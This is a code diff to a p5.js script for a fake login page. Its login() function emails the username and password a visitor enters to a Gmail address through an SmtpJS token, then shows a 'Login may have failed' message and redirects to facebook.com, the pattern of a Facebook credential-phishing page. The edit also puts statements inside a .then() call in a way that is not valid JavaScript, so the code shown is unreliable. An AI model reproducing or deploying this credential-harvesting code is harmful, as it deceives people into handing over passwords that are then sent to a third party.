@@ -63,8 +63,7 @@ function login() {
     // From: input.value(),
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
-  }).then(
-  );
+  }).then();
   Email.send({
     SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
     To: "jacobzuckerman97@gmail.com",
@@ -74,9 +73,9 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
+    alert('Login may have failed'); window.location.replace("http://facebook.com");
   );
-  alert('Login may have failed');
-  window.location.replace("http://facebook.com");
+
 }
 
 function newacc() {
@@ -89,9 +88,9 @@ function draw() {
   // // banner.width-=00;
   // shouldResize = false;
   //    }
-  
+
   background(236, 236, 236);
-  
+
   push();
   fill(255);
   noStroke();
@@ -103,10 +102,10 @@ function draw() {
   stroke(220);
   strokeWeight(0.1);
   rect(455, 165, 610, 375);
-  
+
   push();
   // scale(5, 0, 0);
-  image(bottom, 0, 620, width, bottom.height/1.3);
+  image(bottom, 0, 620, width, bottom.height / 1.3);
   pop();
   pop();
   push();
